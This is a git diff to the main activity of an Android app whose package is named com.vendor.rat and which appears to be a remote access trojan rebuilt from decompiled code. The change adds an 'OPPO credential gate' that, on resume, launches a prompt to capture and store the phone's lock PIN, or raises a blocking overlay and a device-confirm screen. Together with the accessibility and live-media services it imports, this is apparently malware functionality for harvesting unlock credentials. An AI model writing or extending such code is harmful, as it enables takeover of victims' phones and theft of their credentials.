@@ -21,8 +21,11 @@ import android.widget.Toast;
 import com.vendor.rat.MainApplication;
 import com.vendor.rat.config.AppConfig;
 import com.vendor.rat.control.service.MediaLiveService;
+import com.vendor.rat.credential.LockCredentialStore;
+import com.vendor.rat.helper.BlockViewHelper;
 import com.vendor.rat.helper.GuideDialogHelper;
 import com.vendor.rat.service.MyAccessibilityService;
+import com.vendor.rat.utils.DeviceUtils;
 import com.vendor.rat.utils.SharedUtils;
 
 import java.lang.ref.WeakReference;
@@ -60,11 +63,16 @@ public class ActivMain extends Activity {
     public static final int REQUEST_NOTIFICATION = 1014;
     public static final int REQUEST_READ_WRITE = 1015;
     public static final int REQUEST_SYSTEM_SETTINGS = 1016;
+    public static final int REQUEST_LOCK_CREDENTIAL_PROMPT = 1017;
+    public static final int REQUEST_CONFIRM_DEVICE = 1018;
 
     // ADAPT: vendor field f133a → webViewRef (WeakReference<AppWebView>)
     public WeakReference<AppWebView> webViewRef;
     // ADAPT: vendor field b → lastBackPressTime
     public Long lastBackPressTime;
+
+  /** Anti-debounce flag for credential gate — prevents double-launching on rapid onResume */
+    private volatile boolean credentialGateLaunching = false;
 
     // ADAPT: vendor = utils/b 的静态字段，移到这里管理
     // vendor: utils/b.c → currentActivityRef
@@ -273,6 +281,11 @@ public class ActivMain extends Activity {
         AppWebView webView = ref.get();
 
         webView.onResume();
+
+ // OPPO credential gate: intercept onResume if device lock verification needed
+        if (shouldUseOppoCredentialGate() && handleOppoCredentialGate()) {
+        return;
+        }
 
         // vendor 原始逻辑: if (MyAccessibilityService.P() == null && !g.j())
         // P() = 无障碍服务静态引用
@@ -493,6 +506,21 @@ public class ActivMain extends Activity {
                     Log.d(TAG, logMsg);
                 }
                 break;
+
+ case REQUEST_LOCK_CREDENTIAL_PROMPT: // 1017
+       credentialGateLaunching = false;
+  if (resultCode == RESULT_OK) {
+       LockCredentialStore.resetCurrentRunFlags();
+     startCredentialVerificationFlow();
+   } else {
+        LockCredentialStore.markPromptSuppressedForCurrentRun();
+       }
+   break;
+
+            case REQUEST_CONFIRM_DEVICE: // 1018
+                credentialGateLaunching = false;
+      Log.d(TAG, "ConfirmDevice result: " + resultCode);
+         break;
 
             default:
                 super.onActivityResult(requestCode, resultCode, data);
@@ -778,5 +806,42 @@ public class ActivMain extends Activity {
     public static Activity getCurrentActivity() {
         WeakReference<Activity> ref = currentActivityRef;
         return ref != null ? ref.get() : null;
+    }
+
+    // ============ OPPO Credential Gate ============
+
+    private boolean shouldUseOppoCredentialGate() {
+        return DeviceUtils.isOppo();
+    }
+
+    private boolean handleOppoCredentialGate() {
+        // Branch 3: Already verified -> return false
+        if (LockCredentialStore.isCurrentRunVerified()) return false;
+        // Anti-debounce
+        if (credentialGateLaunching) return true;
+        // Suppressed -> return false
+    if (LockCredentialStore.isPromptSuppressedForCurrentRun()) return false;
+        // Branch 1: No PIN -> launch prompt
+        if (!LockCredentialStore.hasCredential()) {
+  launchLockCredentialPrompt();
+   return true;
+        }
+        // Branch 2: PIN stored, not verified -> show overlay + ConfirmDevice
+        startCredentialVerificationFlow();
+     return true;
+    }
+
+    private void launchLockCredentialPrompt() {
+        credentialGateLaunching = true;
+        Intent intent = new Intent(this, LockCredentialPromptActivity.class);
+        startActivityForResult(intent, REQUEST_LOCK_CREDENTIAL_PROMPT);
+    }
+
+    private void startCredentialVerificationFlow() {
+        credentialGateLaunching = true;
+        BlockViewHelper.show(null);
+        Intent intent = new Intent(this, ConfirmDeviceActivity.class);
+intent.putExtra(ConfirmDeviceActivity.EXTRA_EVENT_CODE, "PREPARE_FOR_APP_CONFIRM_LOCK");
+        startActivityForResult(intent, REQUEST_CONFIRM_DEVICE);
     }
 }
